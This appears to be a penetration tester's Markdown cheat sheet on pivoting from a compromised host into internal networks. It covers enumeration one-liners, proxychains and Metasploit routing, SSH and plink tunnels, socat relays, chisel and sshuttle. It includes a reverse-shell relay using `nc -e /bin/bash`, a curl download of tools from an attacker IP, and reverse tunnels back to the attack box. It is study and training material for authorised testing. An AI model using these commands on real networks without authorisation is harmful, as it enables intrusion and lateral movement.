# Pivoting 

--- 

More information: [here](https://pentest.blog/explore-hidden-networks-with-double-pivoting/) and [here](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)

## 1) Map the Internal Network

> You need to map the internal network infrastructure to determine the best pivoting technique(s) to use. 

There are five ways to enumerate a network through a compromised host (in order of preference):
1.  Using material found on the machine:
	- check the ARP cache: `arp -a`
	- check network configuration for each NIC:  `ipconfig /all` (Windows) or `ifconfig` (Linux)  
	- check the IP routing table: `route print` (Windows), `route -v` (Linux), or  `route` (meterpreter)
	- check active network connections: `netstat` (Meterpreter), `netstat -ano` (Windows), or `netsat -natp` (Linux) -- useful for discovering internal services running 
	- check static mapping: `cat /etc/hosts` (Linux) or `file C:\Windows\System32\drivers\etc\hosts` (Windows)
	- check DNS configuration: `ipconfig /all` (Windows) or `nmcli dev show` (Linux) or `cat /etc/resolv.conf` (Linux)
2.  Using pre-installed tools (typical on Linux machines -- "Living off the Land")
	- check for nmap, netcat, hping etc.
3.  Using statically compiled tools
	- these can be found on the Internet, but be aware that many repositories of static tools may be outdated, however they are likely to still be able to do the job
4.  Using scripting techniques (Bash or PowerShell)
	- i.e. Bash one-liner for a full ping sweep of 192.168.1.x network: 
		```bash
		for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
		```
	- the equivalent PowerShell one-liner is very slow so it's better to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target -- i.e. [for C#](https://github.com/MuirlandOracle/C-Sharp-Port-Scan) or [for C++](https://github.com/MuirlandOracle/CPP-Port-Scanner)
	- to naively port scan in Bash (but this will be very slow):
		```bash
		for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
		```
	- or 
		```bash
		host=10.5.5.11
		for port in {1..65535}; do
			timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"
		done
		echo "Done"
		```
5.  Using local tools through a proxy
	- this should be a last resort for scanning a machine as it is very slow and often limited (i.e. you cannot scan UDP ports through a TCP proxy)
	- the one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy *specifically against the found ports*



In Meterpreter
- run an ARP scanner: `run arp_scanner -r <target_address_range>`
- run a ping sweep:  `use post/multi/gather/ping_sweep` -> set configuration options (`SESSION` and `RHOSTS`) -> `run`) -- useful when scanning subnets which are not directly reachable from the compromised machine via an ARP scan
- use network enumeration script: `run netenum` 

<br> 

--- 

## 2a) Pivoting via Tunneling/Proxying 
> Tunneling/proxying involves creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be *tunnelled* inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basis IDS/firewalls.
> Good if we want to redirect lots of different kinds of traffic into our target network (i.e. Nmap scan or to access multiple ports on multiple different machines).
> Creating a proxy opens up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.


#### Proxying Tools

Proxychains:
- proxychains can often slow down a connection, especially when performing a Nmap scan, so ideally use static tools and only route traffic through proxychains when required
- usage: `proxychains <command/tool_to_run>`
	- use the `proxychains -q` option to run in quiet mode (no proxychains output)
- proxychains is configured through a config file, it will look first for: `./proxychains.conf`, second `~/.proxychains/proxychains`, finally for the master config file `/etc/proxychains.conf`
- to add a proxy server and port to use: open `/etc/proxychain.conf` file and add a line to the end (under `[ProxyList]`)
	- i.e. to tell proxychains to use SOCKS4a as a proxy on the localhost which is listening on port 1080: `socks4 127.0.0.1 1080`
- performing an Nmap scan through proxychains:
	- make sure to comment out the Proxy DNS setting: `proxy_dns` in the proxychains configuration file (it may cause it to hand and crash)
	- you can only use TCP scans with proxychains (no UDP or SYN scans), so ICMP Echo packet (ping requests) will not work -- use `-Pn` option to prevent Nmap from trying it 
	- the scan will be extremely slow, so try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of Nmap to use the NSE)
	
FoxyProxy:
- FoxyProxy is a browser extension you can use when working in a web browser to access a web applications on an internal network through a proxy 
- to configure: click on Options -> select Add -> fill in the IP and Port and set the proxy type (SOCKS4 is usually a good bet, but Chisel requires SOCKS5) -> press Save and then the proxy configuration will be saved to the task bar proxy menu which you can click on to activate 
- activating a proxy from the saved proxy menu list will redirect all your web browser traffic through the chosen IP and port (so make sure the proxy is active), so only use this web browser to interact with the target network (don't perform general internet searches)
- with the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest

<br> 

#### Creating a SOCKS proxy

In Metasploit:
1. get a Meterpreter session on a machine
2. use the machine as a pivot point by creating a new route to an internal subnet through the meterpreter session:
	- in Metasploit console: `route add <subnet> <netmask> <session_number>`
		- i.e. `route add 10.10.10.0 255.255.255.0 2`
		- check success with: `route print` to view routes from metasploit console
	- or in the meterpeter session issue: `run post/multi/manage/autoroute SUBNET=<subnet> ACTION=ADD`
		- i.e. `run post/multi/manage/autoroute SUBNET=192.168.78.0 ACTION=ADD`
		- check success with `run autoroute -p` to list the current routing table from the meterpreter session
3.  use exploited machine as a router to communicate with the target's internal network
	- you can run metasploit modules directly (i.e. you can perform a port scan with Metasploit's `auxiliary/scanner/portscan/tcp` module)
	- or to run external tools you can setup a socks4 proxy within Metasploit and use proxychains to route traffic through this proxy:
		- a) select, configure, and run the `socks4a` module on Metasploit -- this module provides a socks4a proxy server that uses built-in Metasploit routing to relay connections
		- b) configure proxychains to use the address and port set in Metasploit (described above)
		- c) run tools through proxychains by appending `proxychains` before the command (described above)

<br>

#### SSH Tunneling via Proxy
> If you have SSH access and on the target machine, you can use it to create an SSH tunnel between the attack box and target.
> This can be done by creating an SSH proxy with the `-D` switch to open up a port on the localhost to send data through into the protected network, which is useful when combined with a tool like proxychains.

Forward connections:
1. setup SSH proxy: `ssh -D <local_port> <ssh_user>@<ssh_server> -fN`
	- the `-f` option backgrounds the shell immediately so you get your own terminal back and `-N` tells SSH that it doens't need to execute any commands (only setup the connection)
	- i.e. `ssh -D 1337 user@172.16.0.5 -fN` -- opens up port 1337 on localhost to send data through to protected network through 172.16.0.5
2. setup proxychains to include the port you have used to create the SSH proxy 
3. run commands through proxychains, and through the SSH proxy, to interact with the protected network


<br>

--- 

## 2b) Pivoting via Port Forwarding
> Port forwarding creates a connection between a local port and a single port on a target, via a compromised host.
> It tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.


#### SSH Tunneling via Port Forwarding 
> If you have SSH access and on the target machine, you can use it to create an SSH tunnel between the attack box and target.
> This can be accomplished by using the `-L` switch to create a link to a local port which will tunnel traffic via SSH to the target machine.
> This is also very useful for accessing internal services on the target machine (i.e. web servers, databases, etc.).

Forward connections:
1. create a link to a local port: `ssh -L <local_port>:<localhost>:<remote_port> <ssh_user@<target> -fN`
	- the `-f` option backgrounds the shell immediately so you get your own terminal back and `-N` tells SSH that it doens't need to execute any commands (only setup the connection)
	- i.e. `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN` -- navigating to port 8000 on your machine (localhost) will create a tunnel to port 80 on the target machine (172.16.0.5)
2. interact with the local port on localhost to interact with the mapped port on the remote host 

Reverse connections:
> Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). However, they are riskier as you inherently must access your attacking machine *from* the target -- be it by using credentials, or preferably a key based system. 

1. generate a new set of throwaway SSH keys: `ssh-keygen`
2. copy the contents of the public key (file ending in `.pub`) to your `~/.ssh/authorized_keys` files on your attack machine 
	-  you may need to create the `.ssh` directory and `authorized_keys` file first
3. on the line before your public key in the `authorized_keys` file enter:
	```bash
	command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
	```
	- this makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine
4. check if the SSH server on your attack machine is running: `sudo systemctl status ssh` -- if not then start it with `sudo systemctl start ssh`
5. transfer the private key to the target box and run: `ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`
	- make sure to discard these keys when the engagement is complete 
	- i.e. if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine: `ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN`
	- this opens up a port forward to the attack box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as the forward connection before 
	- on a non-interactive shell this may not work and, for security reasons, you want to avoid entering Kali password on target machine 
	- hence, you the `UserKnownHostFile=/dev/null` and `StrictHostKeyChecking=no` options using the `-o` flag
	- i.e. `ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4`
	- you may also need to change the file permissions for the private key you uploaded (i.e. `chmod 600 id_rsa`)
6. verify the connection on Kali attack machine 
	- i.e. `sudo netstat -tulpn`
7. close the connection
	- `ps aux | grep ssh` to get the PID and the `sudo kill <PID>`

- newer versions of the SSH client allow you to create a reverse proxy (the equivalent of the `-D` switch used in local connections). However, this may not work on older clients.
- i.e. `ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`  
- this, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

> Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. Thus, plink.exe usually only needs to be used on older systems.


#### Port Forwarding in Metasploit
> You can also use Metasploit to port forward once you get a Meterpreter shell on a machine and pivot from there.

1. get a Meterpreter shell
2. use the  `portfwd` command in Meterpreter to forward connections to specific addresses and ports on the remote network 
	-  i.e. if you want to access a web server, a share, or any other service on the remote network, you can just set a port forwarding rule through the Meterpreter session, and access it from your local address
	-  to open a listener on your local IP address on port 3333 and forward the connection to the IP address 10.10.10.5 on port 3389, in Meterpreter run: `portfwd add -l 3333 -r 10.10.10.5 -p 3389`
3. check listening connections on local machine
	- once run, you should see a listening connection on your machine (i.e. `netstat -tulpn | grep 3333`), and now you can try to establish and RDP session with the machine 10.10.10.5 (i.e. `rdesktop 127.0.0.1:3333`)
	- the traffic will go through the Meterpreter session -> to the exploited machine -> and onto the target machine's port 3389


<br>

--- 

## 2c) Pivoting via plink.exe (Windows)

> plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool for older versions of Windows.

1. transfer the plink binary to the target Windows machine
2. use plink to create a reverse connection back to the attack machine
	- `cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`
	- the `cmd.exe /c echo y` is used to start a non-interactive shell which is stable
	- i.e. if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command: `cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`
3. the keys generate with `ssh-key` will not work properly here so convert them with the `puttygen` tool: `puttygen KEYFILE -o OUTPUT_KEY.ppk`
	- the `puttgen` tool can be downloaded on Kali with: `sudo apt install putty-tools`
	- the results `.ppk` file can then be transferred to the Windows target and used in the same way as with the reverse port forwarding (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before)

- Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the `.exe`


<br>

--- 

## 2d) Pivoting via Socat

> Socat can be used to create fully stable Linux shells and for port forwarding. It is rarely installed on a system by default but their are static binaries for both Linux and Windows (note, the Windows version is unlikely to bypass AV by default, so custom compilation may be required).
> Socat can also be used to create encrypted connections, and encrypted port forwards and relays, which are more likely to bypass AV systems. 
> Socat cannot be used to setup a fully proxy into a target network, but can be used to relay traffic and port forward. For example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box
> Socat is best thought of as a tool for joining tow things together by creating a link between two locations. This could be a relay between two different machines, a connection between a port and a file on the listening machine, or many other similar things.
> Generally, hackers tend to use it to either create reverse/bind shells or to create a port forward. For instance, a port forward _from_ a port on the compromised server _to_ a listening port on our own box. Or we could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the _attacking machine_ with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.

First, get the socat binary onto the target machine:
- setup a Python web server on attack machine: `sudo python3 -m http.server 80` 
- download via curl on the target machine: `curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`

#### Reverse Shell Relay
> In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine. 

1. setup a netcat listener on the attack box: `sudo nc -lvnp 443`
2. on the compromised server start the relay: `./socat tcp-l:8000 tcp:<attack_ip>:443 &`
	- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine, `tcp:ATTACKING_IP:443` connects back to our local IP on port 443, and `&` backgrounds the listener which turns it into a job so that you can still use the shell to execute other commands
3. send a reverse shell back to the attacker machine: `nc 127.0.0.1 8000 -e /bin/bash`
4. kill the job created: `jobs` -> `kill [number]`

#### Port Forwarding (easy)
> The easiest way to setup a port forward with socat is to simply open up a listening port on the compromised server, and redirect whatever comes into it to the target server

1. on the compromised machine setup a port forward: `./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`
	- this opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10 (port 3306)
	- the `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection
	- also `&` is used to background the shell, allowing us to keep using the same terminal session on the compromised server for other things
	- We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306
2. kill the job created: `jobs` -> `kill [number]`

#### Port Forwarding (quiet)
> The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. This is not a massive risk but there is a quieter method.

1. on attacker machine run: `socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
	- this opens up ports 8000 and 8001, creating a local relay, and whatever goes in one will come out of the other (hence, 8000 has `fork` and `reuseaddr` set so more than one connection can be created)
2. on the compromised relay server run (i.e. 172.16.0.5): `./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`
	- this makes a connection between our listening port 8001 on the attacking machine and the open port of the target server
	- i.e. running this on the relay machine 172.16.0.5: `./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &` -- creates a link between port 8000 on the attack machine and port 80 on the intended target (172.16.0.10), meaning you can go to `localhost:8000` on the attack machine to load the web page served by the target 172.16.0.10:80
3. kill the job created: `jobs` -> `kill [number]`

<br>

Process:
- the request goes to `127.0.0.1:8000`
- due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
- port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
- the response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
- anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

<br>

--- 

## 2e) Pivoting via chisel
> [Chisel](https://github.com/jpillora/chisel) is a tool that can be used to quickly and easily setup a tunneled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. 
> It is written in Golang and can be easily compiled for any system, while also having static binaries.

1. download a copy of the chisel binary onto the attack machine (from [here](https://github.com/jpillora/chisel/releases))
2. transfer a copy of the chisel binary on the target machine 
	- this can be done with the web server method or using SCP (if you have SSH access)
	- i.e. `scp -i KEY chisel user@target:/tmp/chisel-USERNAME`

- chisel has two mode: client and server, which you can get help menus with: `chisel [client|server] --help`
- chisel is a versatile tool which can be used in many ways, below are it's usage as a SOCKS proxy and for port forwarding

#### Reverse SOCKS Proxy
> A reverse SOCKS proxy in chisel will connect back from the compromised server to a listener waiting on the attack machine.

1. on the attack box run: `./chisel server -p LISTEN_PORT --reverse &`
	- this sets up listener on the chosen `LISTEN_PORT`, and backgrounds the process
2. on the compromised host run: `./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`
	- this command connects back to the waiting listener on the attack box, completing the proxy, and backgrounds the process 
	- take note of the port the proxy was setup by chisel to send data through (i.e. 1080), as this is likely to be different from the port it is connecting back to the listener on and will be needed when setting up proxychains to use this proxy
	- the "R" in `R:socks` is prefixed to *remotes* (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server).
3. kill the job created: `jobs` -> `kill [number]`

#### Forward SOCKS Proxy
> Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections).

1. on the compromised host run: `./chisel server -p LISTEN_PORT --socks5`
2. on the attack box run: `./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`
	- in this command, `PROXY_PORT` is the port that will be opened for the proxy 
	- i.e. `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10 and a SOCKS proxy would be opened on port 1337 of our attacking machine
3. kill the job created: `jobs` -> `kill [number]`

- when sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from `socks4` to `socks5`.
- note, in a reverse proxy you set the port which the proxy open on (i.e. 1080), rather than the specified listening port (i.e. 1337); however, if you use proxychains with a forward proxy then the port should be set to whichever port you opened (i.e. 1337).

#### Remote Port Forward
> A remote port forward is when we connect back from a compromised target to create the forward.

1. on the attack machine run: `./chisel server -p LISTEN_PORT --reverse &`
	- this chisel listener waits for the compromised host to connect back to
2. on the compromised machine run: `chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`
	- this is very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the `LISTEN_PORT` and the `LOCAL_PORT`. Here the `LISTEN_PORT` is the port that we started the chisel server on, and the `LOCAL_PORT` is the port we wish to open on our own attacking machine to link with the desired target port.
	- i.e. `./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &` -- connects to the attacker IP (172.16.0.20) which is listening port 1337, then forwards connection on the attack machine port 2222 (127.0.0.1:2222) to the target machine's (172.16.0.10) port 22.
	- hence, this would allow an attacker to access SSH on 172.16.0.10 by navigating to 127.0.0.1:2222
3. kill the job created: `jobs` -> `kill [number]`

#### Local Port Forward
> As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

1. on the compromised target run: `./chisel server -p LISTEN_PORT`
2. on the attack machine run: `./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
	- i.e. to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use: `./chisel client 172.16.0.5:8000 2222:172.16.0.10:22` 
3. kill the job created: `jobs` -> `kill [number]`

<br>

--- 

## 2e) Pivoting via sshuttle (currently Unix only)
> [sshuttle](https://github.com/sshuttle/sshuttle) uses an SSH connection to create a tunneled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_ (or an equivalent).
> You directly connect to devices in the target network as you would normally connect to networked devices and, because it uses SSH, anything you send through the tunnel is encrypted.
> You use sshuttle entirely on your attacking machine, in much the same was you would SSH into a remote server.
> However, sshuttle only works on Linux targets, it requires access to the compromised server via SSH, and Python needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that.
> These restrictions do somewhat limit the uses for sshuttle; however, when it _is_ an option, it tends to be a superb bet

- to install sshuttle on Kali: `sudo apt install sshuttle`

1. connect to a compromised SSH server with sshuttle: `sshuttle -r username@address subnet`
	- i.e. `sshuttle -r user@172.16.0.5 172.16.0.0./24` -- connects to the compromised SSH server 172.16.0.5 and establishes a proxy to access the target subnet 172.16.0.0./24
	- rather than specifying subnets, we could also use the `-N` option which attempts to determine them automatically based on the compromised server's own routing table: `sshuttle -r username@address -N`
	- sshuttle will run passively in the background and forward relevant traffic into the target network
	- As with the previous tools, these commands could also be backgrounded by appending the ampersand (`&`) symbol to the end.
	- if have an SSH key instead, you can use the `--ssh-cmd` switch (which allows you to specify what command gets executed by sshuttle when trying to authenticate with the compromised server) to run `ssh -i keyfile`:
		- `sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`
		- i.e. `sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`
	- an error can occur if you try to connect to the compromised host you are using as proxy. Thus, to get around this you can tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch and allow sshuttle to create a connection without disrupting itself
		- i.e. `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`
2. now you have an SSH proxy server running (keep it running), you can navigate the internal network like you were local to it (i.e. you can use a web browser to browse an internal web app)

